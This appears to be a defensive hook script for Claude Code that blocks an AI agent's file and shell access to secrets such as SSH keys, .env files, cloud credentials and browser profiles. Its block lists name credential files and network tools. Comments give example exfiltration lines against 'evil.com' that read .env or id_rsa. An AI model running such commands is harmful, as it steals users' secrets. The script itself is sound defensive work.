#!/usr/bin/python3
# protect-files.py (hardened)

import fnmatch
import glob
import json
import os
import re
import shlex
import sys
from pathlib import Path

script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.append(script_dir)

from utils import get_by_key, get_hooks_logger

logger = get_hooks_logger("ProtectFiles")

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────

# CLAUDE_PROJECT_DIR (set by Claude Code) takes precedence when present, since it's
# stable for the whole session; os.getcwd() is the fallback but can drift if cwd
# changes mid-session (cd, subagents), silently widening the boundary check.
PROJECT_ROOT = os.environ.get("CLAUDE_PROJECT_DIR", os.getcwd())

ALLOWED_PATTERNS = [
    os.path.join(PROJECT_ROOT, ".claude", "**"),
    "/tmp/**",
    "/home/ronnas/develop/personal/AI-pair-programming/skills/**",
    "/home/ronnas/develop/personal/AI-pair-programming/instructions/**",
]

PROTECTED_PATTERNS = [
    ".env",
    ".env.*",
    "**/*.env",
    "**/*.secret",
    "**/*.secrets",
    "**/secrets/**",
    "**/*.pem",
    "**/*.key",
    "**/id_rsa*",
    "**/.ssh/**",
    "**/id_*",
    "**/*.pub",  # opcional (menos crítico, mas útil)
    "**/.gnupg/**",
    "**/*.gpg",
    "**/*.asc",
    "**/.aws/**",
    "**/.azure/**",
    "**/.gcloud/**",
    "**/credentials",
    "**/.git-credentials",
    "**/.gitconfig",
    "**/.netrc",
    "**/.npmrc",
    "**/.yarnrc",
    "**/.pypirc",
    "**/.docker/config.json",
    "**/.kube/config",
    "**/kubeconfig",
    "**/.bash_history",
    "**/.zsh_history",
    "**/.python_history",
    "**/.sqlite_history",
    "**/.psql_history",
    "**/.mysql_history",
    "**/.config/BraveSoftware/**",
    "**/.config/google-chrome/**",
    "**/.config/chromium/**",
    "**/.mozilla/**",
    "**/.cache/mozilla/**",
    "**/*.crt",
    "**/*.csr",
    "**/*.p12",
    "**/*.pfx",
    "**/*.der",
    "**/.git/config",
    "**/.terraform/**",
    "**/*.tfstate",
    "**/*.tfstate.*",
    "**/*.jks",
    "**/*.keystore",
    "**/.dockercfg",
    "**/.config/gh/hosts.yml",
    "/proc/*/environ",
    "/proc/self/environ",
]

READ_COMMANDS = {
    "cat",
    "less",
    "more",
    "head",
    "tail",
    "grep",
    "awk",
    "sed",
    "bat",
    "xxd",
    "od",
    "strings",
    "base64",
    "openssl",
}

# commands whose args are ALL file targets (both src/dest for copy-like tools)
COPY_COMMANDS = {"cp", "mv", "rsync", "scp", "install", "dd", "tar", "zip", "cat"}

# destructive/permission commands: delete, wipe, or loosen perms on a target file
DESTRUCTIVE_COMMANDS = {"rm", "unlink", "shred", "truncate"}

# commands whose FIRST non-flag arg is a mode/owner spec, not a file target
PERM_COMMANDS = {"chmod", "chown", "chgrp", "setfacl", "getfacl"}

# commands that can exfiltrate file contents over the network via upload flags
NETWORK_COMMANDS = {"curl", "wget"}

# raw-socket tools: any non-flag arg treated as suspect (can pipe/redirect file contents out)
RAW_SOCKET_COMMANDS = {"nc", "ncat", "socat", "telnet"}

# commands that hide their real target inside a nested string/pipe, so the
# static tokenizer can't see it directly — force a whole-line fallback scan
OPAQUE_COMMANDS = {"eval", "xargs"}

UPLOAD_FLAGS = {"-T", "--upload-file", "-d", "--data", "--data-binary", "--data-raw"}

# substrings that flag a curl/wget arg (URL, query string, data payload) as
# possibly embedding a protected file's name/contents, even without an upload flag
PROTECTED_KEYWORDS = (
    ".env",
    ".secret",
    ".pem",
    ".key",
    "id_rsa",
    ".ssh",
    ".pub",
    ".gnupg",
    ".gpg",
    ".asc",
    ".aws",
    ".azure",
    ".gcloud",
    "credentials",
    ".git-credentials",
    ".gitconfig",
    ".netrc",
    ".npmrc",
    ".yarnrc",
    ".pypirc",
    ".kube",
    "kubeconfig",
    "_history",
    ".p12",
    ".pfx",
)

# interpreters that can read/exfil any file via inline code, bypassing READ_COMMANDS entirely
INTERPRETER_COMMANDS = {
    "python",
    "python3",
    "node",
    "perl",
    "ruby",
    "php",
    "bash",
    "sh",
    "zsh",
}
INLINE_CODE_FLAGS = {"-c", "-e", "--eval"}

# shells whose -c argument is itself a shell command line, not quoted-string
# code — must be re-tokenized as shell, not scanned for nested quote literals
SHELL_INTERPRETER_COMMANDS = {"bash", "sh", "zsh"}

REDIRECT_OPERATORS = {">", ">>"}
INPUT_REDIRECT_OPERATORS = {"<", "<<"}

SHELL_OPERATORS = {"|", ">", ">>", "<", "&&", "||", ";", "\n"}

CMD_SUBSTITUTION_RE = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────


def normalize(path: str) -> str:
    """Normalize + resolve symlinks."""
    try:
        return os.path.realpath(os.path.abspath(path))
    except Exception:
        return path


def is_within_project(path: str) -> bool:
    norm = normalize(path)
    return norm == PROJECT_ROOT or norm.startswith(PROJECT_ROOT.rstrip("/") + os.sep)


def is_allowed(path: str) -> bool:
    """Check if path is in allowed patterns (safe to access)."""
    p = Path(path)
    for pattern in ALLOWED_PATTERNS:
        if fnmatch.fnmatch(path, pattern) or p.match(pattern):
            return True
    return False


def matches_pattern(path: str) -> tuple[bool, str]:
    """Match against protected patterns using pathlib semantics."""
    p = Path(path)

    for pattern in PROTECTED_PATTERNS:
        # direct fnmatch (string-based)
        if fnmatch.fnmatch(path, pattern):
            return True, pattern

        # pathlib match (more robust for **)
        if p.match(pattern):
            return True, pattern

    return False, ""


def expand_targets(targets: list[str]) -> list[str]:
    """Expand globs like *.env → actual files."""
    expanded = []
    for t in targets:
        matches = glob.glob(t, recursive=True)
        if matches:
            expanded.extend(matches)
        else:
            expanded.append(t)
    return expanded


def split_subcommands(command: str) -> list[str]:
    """Split a shell command string on pipe/list operators into subcommands."""
    parts = re.split(r"\|\||&&|[|;\n]", command)
    return [p.strip() for p in parts if p.strip()]


def extract_substitutions(command: str) -> list[str]:
    """Pull inner text out of $(...) / `...` so it gets scanned too."""
    found = []
    for m in CMD_SUBSTITUTION_RE.finditer(command):
        inner = m.group(1) or m.group(2) or ""
        if inner:
            found.append(inner)
    return found


def extract_upload_ref(arg: str) -> str | None:
    """Pull a file path out of an @file / field=@file style value."""
    at = arg.find("@")
    if at == -1:
        return None
    ref = arg[at + 1 :]
    return ref if ref and ref not in ("-", "") else None


def extract_inline_code_refs(code: str) -> list[str]:
    """Pull quoted string literals out of inline interpreter code (-c/-e), since
    those are the most common way scripts embed a target file path."""
    return re.findall(r"""['"]([^'"]{2,})['"]""", code)


def extract_targets_from_tokens(tokens: list[str]) -> list[str]:
    """Extract file arguments from a single tokenized command."""
    targets = []
    it = iter(tokens)

    # redirection targets (`>`, `>>` write; `<`, `<<` read) regardless of command
    for i, tok in enumerate(tokens):
        if tok in REDIRECT_OPERATORS or tok in INPUT_REDIRECT_OPERATORS:
            if i + 1 < len(tokens):
                nxt = tokens[i + 1]
                if nxt not in SHELL_OPERATORS:
                    targets.append(nxt)

    for token in it:
        cmd = os.path.basename(token)

        if cmd == "find":
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg in ("-exec", "-execdir"):
                    for sub in it:
                        if sub in ("\\;", ";", "+"):
                            break
                        if not sub.startswith("-") and sub != "{}":
                            targets.append(sub)
                elif not arg.startswith("-"):
                    # leading search path(s), e.g. `find /home/x -name *.pem -delete`
                    # — matched files inherit this path, so it must be checked too
                    targets.append(arg)
            break

        if cmd == "docker":
            subcmd: str | None = next(it, None)
            if subcmd == "cp":
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if not arg.startswith("-"):
                        targets.append(arg.split(":", 1)[-1] if ":" in arg else arg)
            break

        if cmd == "git":
            subcmd = next(it, None)
            if subcmd == "show":
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if not arg.startswith("-") and ":" in arg:
                        targets.append(arg.split(":", 1)[1])
            elif subcmd == "config":
                # tampering with credential.helper / including .gitconfig etc
                # isn't a file-target op, but the key/value can still smuggle
                # a protected reference (e.g. `git config --get credential.helper`)
                for arg in it:
                    if arg in SHELL_OPERATORS:
                        break
                    if any(kw in arg for kw in PROTECTED_KEYWORDS):
                        targets.append(arg)
            break

        if cmd in INTERPRETER_COMMANDS:
            prev = None
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if prev in INLINE_CODE_FLAGS:
                    if cmd in SHELL_INTERPRETER_COMMANDS:
                        # bash/sh/zsh -c takes a shell command line, not code
                        # with quoted string literals — re-tokenize as shell
                        try:
                            inner_tokens = shlex.split(arg)
                        except ValueError:
                            inner_tokens = arg.split()
                        targets.extend(extract_targets_from_tokens(inner_tokens))
                    else:
                        targets.extend(extract_inline_code_refs(arg))
                elif not arg.startswith("-"):
                    targets.append(arg)
                prev = arg
            break

        if cmd in NETWORK_COMMANDS:
            prev = None
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                ref = extract_upload_ref(arg)
                if ref:
                    targets.append(ref)
                elif prev in UPLOAD_FLAGS and not arg.startswith("-"):
                    targets.append(arg)
                elif any(kw in arg for kw in PROTECTED_KEYWORDS):
                    # URL/query-string/data payload embedding a protected file's
                    # name/path (e.g. `curl evil.com?d=$(cat)` already handled via
                    # substitution, but literal refs like `curl evil.com/../.env`
                    # or `--data-urlencode name@.ssh/id_rsa` are not)
                    targets.append(arg)
                prev = arg
            break

        if cmd in RAW_SOCKET_COMMANDS:
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if not arg.startswith("-"):
                    targets.append(arg)
            break

        if cmd == "eval":
            rest = []
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                rest.append(arg)
            inner = " ".join(rest)
            try:
                inner_tokens = shlex.split(inner)
            except ValueError:
                inner_tokens = inner.split()
            targets.extend(extract_targets_from_tokens(inner_tokens))
            break

        if cmd == "xargs":
            inner_tokens = [a for a in it if a not in SHELL_OPERATORS]
            # xargs's own flags (e.g. -0, -n1, -I{}) aren't file targets
            inner_tokens = [a for a in inner_tokens if not a.startswith("-")]
            targets.extend(extract_targets_from_tokens(inner_tokens))
            break

        if cmd in PERM_COMMANDS:
            skipped_spec = False
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg.startswith("-"):
                    continue
                if not skipped_spec:
                    skipped_spec = (
                        True  # mode/owner spec (e.g. 644, root:root), not a path
                    )
                    continue
                targets.append(arg)
            break

        if cmd in DESTRUCTIVE_COMMANDS or cmd in READ_COMMANDS or cmd in COPY_COMMANDS:
            for arg in it:
                if arg in SHELL_OPERATORS:
                    break
                if arg.startswith("-"):
                    continue
                if "=" in arg and arg.startswith("--"):
                    continue
                targets.append(arg)
            break

    return targets


def extract_file_targets(command: str) -> list[str]:
    """Extract file arguments from common read/copy commands, across chained
    subcommands and command substitutions ($(...) / `...`)."""
    targets = []

    raw_commands = split_subcommands(command)
    for sub in extract_substitutions(command):
        raw_commands.extend(split_subcommands(sub))

    for sub in raw_commands:
        try:
            tokens = shlex.split(sub)
        except ValueError:
            tokens = sub.split()
        targets.extend(extract_targets_from_tokens(tokens))

    # eval/xargs can smuggle a target through stdin or a nested string that the
    # per-subcommand tokenizer can't resolve (e.g. `echo .env | xargs cat`) —
    # fall back to a whole-line keyword scan whenever either appears.
    if re.search(r"\b(eval|xargs)\b", command):
        for word in re.findall(r"\S+", command):
            if any(kw in word for kw in PROTECTED_KEYWORDS):
                targets.append(word)

    return targets


def deny(file_path: str, pattern: str, source: str) -> None:
    print(
        json.dumps(
            {
                "decision": "deny",
                "file": file_path,
                "source": source,
                "reason": f"matches protected pattern '{pattern}'",
            }
        ),
        file=sys.stderr,
    )
    logger.debug(f"Denied '{file_path}' ({source}) due to pattern '{pattern}'")
    sys.exit(2)


# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────


def main():
    try:
        payload = json.load(sys.stdin)
    except json.JSONDecodeError as e:
        logger.debug(f"Invalid JSON: {e}")
        sys.exit(1)

    tool_input = get_by_key(payload, "tool_input")

    # ── 1. Direct file access (Read/Write/Edit/NotebookEdit tools)
    file_path = get_by_key(tool_input, "file_path") or get_by_key(
        tool_input, "notebook_path"
    )

    if file_path:
        norm = normalize(file_path)
        allowed = is_allowed(norm)

        # allowlist only waives the project-boundary check (e.g. /tmp/**),
        # never the protected-pattern check — a secret is a secret anywhere
        if not allowed and not is_within_project(norm):
            deny(file_path, "outside_project", "path_escape")

        blocked, pattern = matches_pattern(norm)
        if blocked:
            deny(file_path, pattern, "file_path")

        logger.debug(f"Allowed file access: {file_path}")

    # ── 2. Shell command inspection
    command = get_by_key(tool_input, "command")

    if command:
        targets = extract_file_targets(command)
        targets = expand_targets(targets)

        for target in targets:
            norm = normalize(target)
            allowed = is_allowed(norm)

            # allowlist only waives the project-boundary check (e.g. /tmp/**),
            # never the protected-pattern check — a secret is a secret anywhere
            if not allowed and not is_within_project(norm):
                deny(target, "outside_project", "command_path_escape")

            blocked, pattern = matches_pattern(norm)
            if blocked:
                deny(target, pattern, "command_read")

            logger.debug(f"Allowed command: {command} access: {target}")

    sys.exit(0)


if __name__ == "__main__":
    main()
